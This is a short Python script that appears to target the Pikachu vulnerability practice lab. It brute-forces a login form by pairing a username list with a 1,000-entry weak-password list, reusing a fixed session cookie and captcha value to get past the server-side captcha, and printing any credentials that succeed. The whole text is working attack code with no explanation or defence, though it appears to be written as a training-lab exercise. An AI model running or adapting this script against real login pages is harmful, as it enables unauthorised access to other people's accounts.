import re
import requests
url = "http://192.168.1.192:8086/pikachu/vul/burteforce/bf_server.php"
def burteforce_server(url):
    with open('user.txt', 'r') as user:
        for username in user:
            with open('弱口令1000', 'r') as passwd:
                for password in passwd:
                    header = {
                        'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
                    }
                    data = {
                        'username': username.strip(),
                        'password': password.strip(),
                        'submit': 'Login',
                        'vcode': 'feijs7'  # 根据实际情况改动
                    }
                    res = requests.post(url=url, headers=header, data=data)
                    if re.findall('login success', res.text):
                        print('破解成功')
                        print("用户名是：", username.strip())
                        print("密码是：", password.strip())
                        return True

    return False